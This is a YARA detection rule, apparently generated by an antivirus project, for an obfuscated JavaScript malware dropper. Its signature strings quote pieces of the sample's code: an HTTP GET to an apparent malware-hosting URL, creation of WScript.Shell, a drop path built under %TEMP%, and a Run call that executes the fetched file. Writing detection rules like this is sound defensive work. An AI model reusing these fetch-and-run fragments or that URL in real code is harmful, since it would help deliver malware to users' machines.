rule sig_20160427_566a8025501b3c535a697a95ee899842 {
  meta:
    description = "datamaliciousorder - file 20160427_566a8025501b3c535a697a95ee899842.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "41b7595353e111fbc8046ac18a9f92a3a11255d3bbc8fe46cdc1a07f216770ab"

  strings:
    $s1  = "ChbpvLbvgc[XahvtNsrwt](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/ur8fgs\", false);" fullword ascii
    $s2  = "function DrtdmVdwtd() {return IhpugPbhpq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"HiolCGg" ascii
    $s3  = "function DrtdmVdwtd() {return IhpugPbhpq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"HiolCGg" ascii
    $s4  = "var IhpugPbhpq = function OuxxhQzqgb() {return DvaumSjufj[EqyakYmljz](\"WScript\"+\".Shell\");}(), JgyvpFptdn = 11;" fullword ascii
    $s5  = "function QxqomAuqpu(FrwfnWcsct, DpdbyNtztb){ForoqQbbtf = ForoqQbbtf * 1; return FrwfnWcsct - DpdbyNtztb;};" fullword ascii
    $s6  = "var DvaumSjufj = this[\"WScript\"];" fullword ascii
    $s7  = "if (ChbpvLbvgc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function GgrayMytmd(){return WfbtcRhhte + \"\";};" fullword ascii
    $s9  = "function XeguaPisbr(SokatMipbm) {var KyvleTmpwv = (1, 2, 3, 4, 5, SokatMipbm); return KyvleTmpwv;};" fullword ascii
    $s10 = "function SzabzFwdmi() {return ((CotivEjxel == true) && (CotivEjxel == YeimkPpnun)) ? 1 : ForoqQbbtf;};" fullword ascii
    $s11 = "var CotivEjxel = false;" fullword ascii
    $s12 = "function XbjekSfogh(XwpinEirrn){IhpugPbhpq[\"R\"+\"un\"](XwpinEirrn, ForoqQbbtf, ForoqQbbtf);};" fullword ascii
    $s13 = "YeimkPpnun = true; " fullword ascii
    $s14 = "function ZadyxKpccp(){return 23;};" fullword ascii
    $s15 = "}while (QopjgVccjs);" fullword ascii
    $s16 = "HsoarJubaq = true;" fullword ascii
    $s17 = "function ZqcxdChygc(){return EqyakYmljz;};" fullword ascii
    $s18 = "return QxqomAuqpu(DkktuOvkim, SmxbmOcyib);" fullword ascii
    $s19 = "var HsoarJubaq = false;" fullword ascii
    $s20 = "CotivEjxel = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}